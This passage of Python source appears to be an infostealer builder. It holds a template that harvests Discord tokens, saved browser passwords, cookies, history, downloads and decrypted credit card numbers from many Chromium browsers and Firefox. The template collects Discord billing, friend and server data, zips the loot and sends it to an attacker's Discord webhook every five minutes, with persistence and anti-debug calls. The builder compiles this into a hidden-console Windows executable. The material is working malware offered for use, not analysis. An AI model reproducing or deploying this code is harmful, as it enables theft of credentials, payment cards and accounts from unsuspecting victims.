            'Chrome5': self.appdata + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\',
            'Epic Privacy Browser': self.appdata + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
            'Microsoft Edge': self.appdata + '\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\',
            'Uran': self.appdata + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
            'Yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Iridium': self.appdata + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
        }

        for name, path in paths.items():
            if not os.path.exists(path):
                continue
            _discord = name.replace(" ", "").lower()
            if "cord" in path:
                if not os.path.exists(self.roaming+f'\\{_discord}\\Local State'):
                    continue
                for file_name in os.listdir(path):
                    if file_name[-3:] not in ["log", "ldb"]:
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                        for y in re.findall(self.regexp_enc, line):
                            token = self.decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[
                                                     1]), self.get_master_key(self.roaming+f'\\{_discord}\\Local State'))

                            if self.validate_token(token):
                                uid = requests.get(self.base_url, headers={
                                                   'Authorization': token}).json()['id']
                                if uid not in self.uids:
                                    self.tokens.append(token)
                                    self.uids.append(uid)

            else:
                for file_name in os.listdir(path):
                    if file_name[-3:] not in ["log", "ldb"]:
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                        for token in re.findall(self.regexp, line):
                            if self.validate_token(token):
                                uid = requests.get(self.base_url, headers={
                                                   'Authorization': token}).json()['id']
                                if uid not in self.uids:
                                    self.tokens.append(token)
                                    self.uids.append(uid)

        if os.path.exists(self.roaming+"\\Mozilla\\Firefox\\Profiles"):
            for path, _, files in os.walk(self.roaming+"\\Mozilla\\Firefox\\Profiles"):
                for _file in files:
                    if not _file.endswith('.sqlite'):
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{_file}', errors='ignore').readlines() if x.strip()]:
                        for token in re.findall(self.regexp, line):
                            if self.validate_token(token):
                                uid = requests.get(self.base_url, headers={
                                                   'Authorization': token}).json()['id']
                                if uid not in self.uids:
                                    self.tokens.append(token)
                                    self.uids.append(uid)

    def validate_token(self, token: str) -> bool:
        r = requests.get(self.base_url, headers={'Authorization': token})

        if r.status_code == 200:
            return True

        return False

    def decrypt_val(self, buff: bytes, master_key: bytes) -> str:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()

        return decrypted_pass

    def get_master_key(self, path: str) -> str:
        if not os.path.exists(path):
            return

        if 'os_crypt' not in open(path, 'r', encoding='utf-8').read():
            return

        with open(path, "r", encoding="utf-8") as f:
            c = f.read()
        local_state = json.loads(c)

        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]

        return master_key


class upload_tokens:
    def __init__(self, webhook: str):
        self.tokens = extract_tokens().tokens
        self.webhook = SyncWebhook.from_url(webhook)

    def calc_flags(self, flags: int) -> list:
        flags_dict = {
            "DISCORD_EMPLOYEE": {
                "emoji": "<:staff:968704541946167357>",
                "shift": 0,
                "ind": 1
            },
            "DISCORD_PARTNER": {
                "emoji": "<:partner:968704542021652560>",
                "shift": 1,
                "ind": 2
            },
            "HYPESQUAD_EVENTS": {
                "emoji": "<:hypersquad_events:968704541774192693>",
                "shift": 2,
                "ind": 4
            },
            "BUG_HUNTER_LEVEL_1": {
                "emoji": "<:bug_hunter_1:968704541677723648>",
                "shift": 3,
                "ind": 4
            },
            "HOUSE_BRAVERY": {
                "emoji": "<:hypersquad_1:968704541501571133>",
                "shift": 6,
                "ind": 64
            },
            "HOUSE_BRILLIANCE": {
                "emoji": "<:hypersquad_2:968704541883261018>",
                "shift": 7,
                "ind": 128
            },
            "HOUSE_BALANCE": {
                "emoji": "<:hypersquad_3:968704541874860082>",
                "shift": 8,
                "ind": 256
            },
            "EARLY_SUPPORTER": {
                "emoji": "<:early_supporter:968704542126510090>",
                "shift": 9,
                "ind": 512
            },
            "BUG_HUNTER_LEVEL_2": {
                "emoji": "<:bug_hunter_2:968704541774217246>",
                "shift": 14,
                "ind": 16384
            },
            "VERIFIED_BOT_DEVELOPER": {
                "emoji": "<:verified_dev:968704541702905886>",
                "shift": 17,
                "ind": 131072
            },
            "ACTIVE_DEVELOPER": {
                "emoji": "<:Active_Dev:1045024909690163210>",
                "shift": 22,
                "ind": 4194304
            },
            "CERTIFIED_MODERATOR": {
                "emoji": "<:certified_moderator:988996447938674699>",
                "shift": 18,
                "ind": 262144
            },
            "SPAMMER": {
                "emoji": "⌨",
                "shift": 20,
                "ind": 1048704
            },
        }

        return [[flags_dict[flag]['emoji'], flags_dict[flag]['ind']] for flag in flags_dict if int(flags) & (1 << flags_dict[flag]["shift"])]

    def upload(self):
        if not self.tokens:
            return

        for token_discord in self.tokens:
            user = requests.get(
                'https://discord.com/api/v8/users/@me', headers={'Authorization': token_discord}).json()
            billing_discord = requests.get(
                'https://discord.com/api/v6/users/@me/billing/payment-sources', headers={'Authorization': token_discord}).json()
            guilds = requests.get(
                'https://discord.com/api/v9/users/@me/guilds?with_counts=true', headers={'Authorization': token_discord}).json()
            friends = requests.get(
                'https://discord.com/api/v8/users/@me/relationships', headers={'Authorization': token_discord}).json()
            gift_codes_discord = requests.get(
                'https://discord.com/api/v9/users/@me/outbound-promotions/codes', headers={'Authorization': token_discord}).json()

            username_discord = user['username'] + '#' + user['discriminator']
            user_id_discord = user['id']
            email_discord = user['email']
            phone_discord = user['phone']
            mfa_discord = user['mfa_enabled']
            try:
             avatar_discord = f"https://cdn.discordapp.com/avatars/{user_id_discord}/{user['avatar']}.gif" if requests.get(
                f"https://cdn.discordapp.com/avatars/{user_id_discord}/{user['avatar']}.gif").status_code == 200 else f"https://cdn.discordapp.com/avatars/{user_id_discord}/{user['avatar']}.png"
            except:
                 avatar_discord = avatar_embed
            badges_discord = ' '.join([flag[0]
                              for flag in self.calc_flags(user['public_flags'])])

            if user['premium_type'] == 0:
                nitro_discord = 'None'
            elif user['premium_type'] == 1:
                nitro_discord = 'Nitro Classic'
            elif user['premium_type'] == 2:
                nitro_discord = 'Nitro Boosts'
            elif user['premium_type'] == 3:
                nitro_discord = 'Nitro Basic'
            else:
                nitro_discord = 'None'

            if billing_discord:
                payment_methods = []

                for method in billing_discord:
                    if method['type'] == 1:
                        payment_methods.append('💳')

                    elif method['type'] == 2:
                        payment_methods.append("Paypal: ")

                    else:
                        payment_methods.append('❓')

                payment_methods = ', '.join(payment_methods)

            else:
                billing_discord = None

            if guilds:
                hq_guilds_discord = []
                for guild in guilds:
                    admin = True if guild['permissions'] == '4398046511103' else False
                    if admin and guild['approximate_member_count'] >= 100:
                        owner = "✅" if guild['owner'] else "❌"

                        invites = requests.get(
                            f"https://discord.com/api/v8/guilds/{guild['id']}/invites", headers={'Authorization': token_discord}).json()
                        if len(invites) > 0:
                            invite = f"https://discord.gg/{invites[0]['code']}"
                        else:
                            invite = "None"

                        data = f"\u200b\n**{guild['name']} ({guild['id']})** \n Owner: `{owner}` | Members: ` ⚫ {guild['approximate_member_count']} / 🟢 {guild['approximate_presence_count']} / 🔴 {guild['approximate_member_count'] - guild['approximate_presence_count']} `\n[Join Server]({invite})"

                        if len('\n'.join(hq_guilds_discord)) + len(data) >= 1024:
                            break

                        hq_guilds_discord.append(data)

                if len(hq_guilds_discord) > 0:
                    hq_guilds_discord = '\n'.join(hq_guilds_discord)

                else:
                    hq_guilds_discord = None

            else:
                hq_guilds_discord = None

            if friends:
                hq_friends_discord = []
                for friend in friends:
                    unprefered_flags = [64, 128, 256, 1048704]
                    inds = [flag[1] for flag in self.calc_flags(
                        friend['user']['public_flags'])[::-1]]
                    for flag in unprefered_flags:
                        inds.remove(flag) if flag in inds else None
                    if inds != []:
                        hq_badges = ' '.join([flag[0] for flag in self.calc_flags(
                            friend['user']['public_flags'])[::-1]])

                        data = f"{friend['user']['username']}#{friend['user']['discriminator']} ({friend['user']['id']})  "

                        if len('\n'.join(hq_friends_discord)) + len(data) >= 1024:
                            break

                        hq_friends_discord.append(data)

                if len(hq_friends_discord) > 0:
                    hq_friends_discord = '\n'.join(hq_friends_discord)

                else:
                    hq_friends_discord = None

            else:
                hq_friends_discord = None

            if gift_codes_discord:
                codes = []
                for code in gift_codes_discord:
                    name = code['promotion']['outbound_title']
                    code = code['code']

                    data = f":gift: `{name}`\n:ticket: `{code}`"

                    if len('\n\n'.join(codes)) + len(data) >= 1024:
                        break

                    codes.append(data)

                if len(codes) > 0:
                    codes = '\n\n'.join(codes)

                else:
                    codes = None

            else:
                gift_codes_discord = None

            embed = Embed(title=f':flag_{country_code}: | Discord Info `{username_pc} "{ip_address_public}"`:', color=color_embed)
            embed.set_thumbnail(url=avatar_discord)

            embed.add_field(name=":bust_in_silhouette: | Username:",
                            value=f"```{username_discord}```", inline=True)
            embed.add_field(name=":robot: | Id:",
                            value=f"```{user_id_discord}```", inline=True)
            embed.add_field(name=":e_mail: | Email:",
                            value=f"```{email_discord}```", inline=True)
            embed.add_field(name=":telephone_receiver: | Phone:",
                            value=f"```{phone_discord}```", inline=True)   
            embed.add_field(name=":globe_with_meridians: | Token:",
                            value=f"```{token_discord}```", inline=True)
            embed.add_field(name=":rocket: | Nitro:",
                            value=f"```{nitro_discord}```", inline=True)
            embed.add_field(name=":moneybag: | Billing:",
                            value=f"```{billing_discord}```", inline=True)
            embed.add_field(name=":people_hugging: | Friends:",
                            value=f"```{hq_friends_discord}```", inline=True)
            embed.add_field(name=":tickets: | Badges:",
                            value=f"{badges_discord}", inline=True)   
            embed.add_field(name=":gift: | Gift Code:",
                            value=f"```{gift_codes_discord}```", inline=True)
            embed.add_field(name=":lock: | Multi-Factor Authentication:",
                            value=f"```{mfa_discord}```", inline=True)
            embed.add_field(name=":link: | Guilds:",
                            value=f"{hq_guilds_discord}", inline=True)

            embed.set_footer(text=footer_text, icon_url=avatar_embed)

            self.webhook.send(embed=embed, username=username_embed,
                              avatar_url=avatar_embed)




__LOGINS__ = []
__COOKIES__ = []
__WEB_HISTORY__ = []
__DOWNLOADS__ = []
__CARDS__ = []


class Browsers_Info:
    def __init__(self, webhook):
        self.webhook = SyncWebhook.from_url(webhook)

        Chromium()
        Upload(self.webhook)


class Upload:

    def __init__(self, webhook: SyncWebhook):
        self.webhook = webhook

        self.write_files()
        self.send()
        self.clean()

    def write_files(self):
        os.makedirs(f"Browsers_{username_pc}", exist_ok=True)
        if __LOGINS__:
            with open(f"Browsers_{username_pc}\\browsers_{username_pc}_passwords.txt", "w", encoding="utf-8") as f:
                f.write('\n'.join(str(x) for x in __LOGINS__))

        if __COOKIES__:
            with open(f"Browsers_{username_pc}\\browsers_{username_pc}_cookies.txt", "w", encoding="utf-8") as f:
                f.write('\n'.join(str(x) for x in __COOKIES__))

        if __WEB_HISTORY__:
            with open(f"Browsers_{username_pc}\\browsers_{username_pc}_history.txt", "w", encoding="utf-8") as f:
                f.write('\n'.join(str(x) for x in __WEB_HISTORY__))

        if __DOWNLOADS__:
            with open(f"Browsers_{username_pc}\\browsers_{username_pc}_downloads.txt", "w", encoding="utf-8") as f:
                f.write('\n'.join(str(x) for x in __DOWNLOADS__))

        if __CARDS__:
            with open(f"Browsers_{username_pc}\\browsers_{username_pc}_cards.txt", "w", encoding="utf-8") as f:
                f.write('\n'.join(str(x) for x in __CARDS__))

        with ZipFile(f"Browsers_{username_pc}.zip", "w") as zip:
            for file in os.listdir(f"Browsers_{username_pc}"):
                zip.write(f"Browsers_{username_pc}\\{file}", file)
    def send(self):
        self.webhook.send(
            embed=Embed(
                title=f":flag_{country_code}: | Browsers Info `{username_pc} \"{ip_address_public}\"`:",
                description="```" +
                '\n'.join(self.tree(Path(f"Browsers_{username_pc}"))) + "```",
                color=color_embed,
            ).set_footer(
                 text=footer_text,
                 icon_url=avatar_embed
            ),
            file=File(f"Browsers_{username_pc}.zip"),
            username=username_embed,
            avatar_url=avatar_embed,

        )

    def clean(self):
        shutil.rmtree(f"Browsers_{username_pc}")
        os.remove(f"Browsers_{username_pc}.zip")

    def tree(self, path: Path, prefix: str = '', midfix_folder: str = '📂 - ', midfix_file: str = '📄 - '):
        pipes = {
            'space':  '    ',
            'branch': '│   ',
            'tee':    '├── ',
            'last':   '└── ',
        }

        if prefix == '':
            yield midfix_folder + path.name

        contents = list(path.iterdir())
        pointers = [pipes['tee']] * (len(contents) - 1) + [pipes['last']]
        for pointer, path in zip(pointers, contents):
            if path.is_dir():
                yield f"{prefix}{pointer}{midfix_folder}{path.name} ({len(list(path.glob('**/*')))} files, {sum(f.stat().st_size for f in path.glob('**/*') if f.is_file()) / 1024:.2f} kb)"
                extension = pipes['branch'] if pointer == pipes['tee'] else pipes['space']
                yield from self.tree(path, prefix=prefix+extension)
            else:
                yield f"{prefix}{pointer}{midfix_file}{path.name} ({path.stat().st_size / 1024:.2f} kb)"
    

class Chromium:

    def __init__(self):
        self.appdata = os.getenv('LOCALAPPDATA')
        self.browsers = {
            'amigo': self.appdata + '\\Amigo\\User Data',
            'torch': self.appdata + '\\Torch\\User Data',
            'kometa': self.appdata + '\\Kometa\\User Data',
            'orbitum': self.appdata + '\\Orbitum\\User Data',
            'cent-browser': self.appdata + '\\CentBrowser\\User Data',
            '7star': self.appdata + '\\7Star\\7Star\\User Data',
            'sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data',
            'vivaldi': self.appdata + '\\Vivaldi\\User Data',
            'google-chrome-sxs': self.appdata + '\\Google\\Chrome SxS\\User Data',
            'google-chrome': self.appdata + '\\Google\\Chrome\\User Data',
            'epic-privacy-browser': self.appdata + '\\Epic Privacy Browser\\User Data',
            'microsoft-edge': self.appdata + '\\Microsoft\\Edge\\User Data',
            'uran': self.appdata + '\\uCozMedia\\Uran\\User Data',
            'yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data',
            'brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
            'iridium': self.appdata + '\\Iridium\\User Data',
        }
        self.profiles = [
            'Default',
            'Profile 1',
            'Profile 2',
            'Profile 3',
            'Profile 4',
            'Profile 5',
        ]

        for _, path in self.browsers.items():
            if not os.path.exists(path):
                continue

            self.master_key = self.get_master_key(f'{path}\\Local State')
            if not self.master_key:
                continue

            for profile in self.profiles:
                if not os.path.exists(path + '\\' + profile):
                    continue

                operations = [
                    self.get_login_data,
                    self.get_cookies,
                    self.get_web_history,
                    self.get_downloads,
                    self.get_credit_cards,
                ]

                for operation in operations:
                    try:
                        operation(path, profile)
                    except Exception as e:
                        # print(e)
                        pass

    def get_master_key(self, path: str) -> str:
        if not os.path.exists(path):
            return

        if 'os_crypt' not in open(path, 'r', encoding='utf-8').read():
            return

        with open(path, "r", encoding="utf-8") as f:
            c = f.read()
        local_state = json.loads(c)

        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key

    def decrypt_password(self, buff: bytes, master_key: bytes) -> str:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()

        return decrypted_pass

    def get_login_data(self, path: str, profile: str):
        login_db = f'{path}\\{profile}\\Login Data'
        if not os.path.exists(login_db):
            return

        shutil.copy(login_db, 'login_db')
        conn = sqlite3.connect('login_db')
        cursor = conn.cursor()
        cursor.execute(
            'SELECT action_url, username_value, password_value FROM logins')
        for row in cursor.fetchall():
            if not row[0] or not row[1] or not row[2]:
                continue

            password = self.decrypt_password(row[2], self.master_key)
            __LOGINS__.append(Types.Login(row[0], row[1], password))

        conn.close()
        os.remove('login_db')

    def get_cookies(self, path: str, profile: str):
        cookie_db = f'{path}\\{profile}\\Network\\Cookies'
        if not os.path.exists(cookie_db):
            return

        try:
            shutil.copy(cookie_db, 'cookie_db')
            conn = sqlite3.connect('cookie_db')
            cursor = conn.cursor()
            cursor.execute(
                'SELECT host_key, name, path, encrypted_value,expires_utc FROM cookies')
            for row in cursor.fetchall():
                if not row[0] or not row[1] or not row[2] or not row[3]:
                    continue

                cookie = self.decrypt_password(row[3], self.master_key)
                __COOKIES__.append(Types.Cookie(
                    row[0], row[1], row[2], cookie, row[4]))

            conn.close()
        except:
            print()

        os.remove('cookie_db')

    def get_web_history(self, path: str, profile: str):
        web_history_db = f'{path}\\{profile}\\History'
        if not os.path.exists(web_history_db):
            return

        shutil.copy(web_history_db, 'web_history_db')
        conn = sqlite3.connect('web_history_db')
        cursor = conn.cursor()
        cursor.execute('SELECT url, title, last_visit_time FROM urls')
        for row in cursor.fetchall():
            if not row[0] or not row[1] or not row[2]:
                continue

            __WEB_HISTORY__.append(Types.WebHistory(row[0], row[1], row[2]))

        conn.close()
        os.remove('web_history_db')

    def get_downloads(self, path: str, profile: str):
        downloads_db = f'{path}\\{profile}\\History'
        if not os.path.exists(downloads_db):
            return

        shutil.copy(downloads_db, 'downloads_db')
        conn = sqlite3.connect('downloads_db')
        cursor = conn.cursor()
        cursor.execute('SELECT tab_url, target_path FROM downloads')
        for row in cursor.fetchall():
            if not row[0] or not row[1]:
                continue

            __DOWNLOADS__.append(Types.Download(row[0], row[1]))

        conn.close()
        os.remove('downloads_db')

    def get_credit_cards(self, path: str, profile: str):
        cards_db = f'{path}\\{profile}\\Web Data'
        if not os.path.exists(cards_db):
            return

        shutil.copy(cards_db, 'cards_db')
        conn = sqlite3.connect('cards_db')
        cursor = conn.cursor()
        cursor.execute(
            'SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards')
        for row in cursor.fetchall():
            if not row[0] or not row[1] or not row[2] or not row[3]:
                continue

            card_number = self.decrypt_password(row[3], self.master_key)
            __CARDS__.append(Types.CreditCard(
                row[0], row[1], row[2], card_number, row[4]))

        conn.close()
        os.remove('cards_db')


class Types:
    class Login:
        def __init__(self, url, username, password):
            self.url = url
            self.username = username
            self.password = password

        def __str__(self):
            return f'{self.url}\t{self.username}\t{self.password}'

        def __repr__(self):
            return self.__str__()

    class Cookie:
        def __init__(self, host, name, path, value, expires):
            self.host = host
            self.name = name
            self.path = path
            self.value = value
            self.expires = expires

        def __str__(self):
            return f'{self.host}\t{"FALSE" if self.expires == 0 else "TRUE"}\t{self.path}\t{"FALSE" if self.host.startswith(".") else "TRUE"}\t{self.expires}\t{self.name}\t{self.value}'

        def __repr__(self):
            return self.__str__()

    class WebHistory:
        def __init__(self, url, title, timestamp):
            self.url = url
            self.title = title
            self.timestamp = timestamp

        def __str__(self):
            return f'{self.url}\t{self.title}\t{self.timestamp}'

        def __repr__(self):
            return self.__str__()

    class Download:
        def __init__(self, tab_url, target_path):
            self.tab_url = tab_url
            self.target_path = target_path

        def __str__(self):
            return f'{self.tab_url}\t{self.target_path}'

        def __repr__(self):
            return self.__str__()

    class CreditCard:
        def __init__(self, name, month, year, number, date_modified):
            self.name = name
            self.month = month
            self.year = year
            self.number = number
            self.date_modified = date_modified

        def __str__(self):
            return f'{self.name}\t{self.month}\t{self.year}\t{self.number}\t{self.date_modified}'

        def __repr__(self):
            return self.__str__()
try:
    Startup()
except:
    ()
try:
    System_Info()
except:
    ()
try:
    Screenshot(webhook_url)
except:
    ()
try:
    Discord_Info(webhook_url)
except:
    ()
try:
    Browsers_Info(webhook_url)
except:
    ()

payload = {
    'content': f'****╚══════════════════{ip_address_public}══════════════════╝****',
    'username': username_embed,
    'avatar_url': avatar_embed,
}
requests.post(webhook_url, json=payload)

while True:

    time.sleep(300)

    payload = {
    'content': f'****╔════════════════════Injection═══════════════════╗****',
    'username': username_embed,
    'avatar_url': avatar_embed,
    }
    requests.post(webhook_url, json=payload)

    try:
        AntiDebug()
    except:
        ()
    try:
        Screenshot(webhook_url)
    except:
        ()
    try:
        Discord_Info(webhook_url)
    except:
        ()
    try:
        Browsers_Info(webhook_url)
    except:
        ()

    payload = {
    'content': f'****╚══════════════════{ip_address_public}══════════════════╝****',
    'username': username_embed,
    'avatar_url': avatar_embed,
    }
    requests.post(webhook_url, json=payload)
''')

with open(file_text, 'r', encoding='utf-8') as file_txt:
    contenu = file_txt.read()

with open(file_python, 'w', encoding='utf-8') as file_py:
    file_py.write(contenu)

with open(file_text, 'w', encoding='utf-8') as file:
    file.write(f"{path_destination}")


def convert_to_exe(script_name, destination_path, icon_path=None):
    print(f"{color.RED}\n[!] | Converting to .exe:{color.RESET}")
    try:
        script_path = os.path.abspath(script_name)

        if not os.path.exists(destination_path):
            os.makedirs(destination_path)

        pyinstaller_command = ['pyinstaller', '--onefile', '--distpath', destination_path, '--noconsole', script_path]

        if icon_path:
            pyinstaller_command.extend(['--icon', icon_path])

        subprocess.run(pyinstaller_command)

        print(f"{color.RED}[!] | Conversion successful. The executable is located in the folder \"{color.WHITE}{destination_path}{color.RED}\"")
    except Exception as e:
        print(f"{color.RED}[X] | Error during conversion: {color.WHITE}{e}")

if icone in ['y', 'Y', 'Yes', 'yes', 'oui', 'Oui']:
 convert_to_exe(file_python, path_destination, icon_path)
else: 
 convert_to_exe(file_python, path_destination)

print(f"{color.RED}[!] | Removing temporary files from conversion..{color.RESET}")
try:
    directory = os.getcwd()
    shutil.rmtree(f"{directory}/build")
    os.remove(f"{name_file}.spec")
    os.remove(file_text)
    os.remove(file_python)
    print(f"{color.RED}[!] | Temporary file removed.{color.RESET}")
except:
   print(f"{color.RED}[!] | Temporary file not removed.{color.RESET}")

try:
    print(f"{color.RED}[!] | Open \"{color.WHITE}{path_destination}{color.RED}\"")
    path = directory + "/1-File-Create"
    path = os.path.realpath(path)
    os.startfile(path)
except:
   ()
Continue()
Reset()
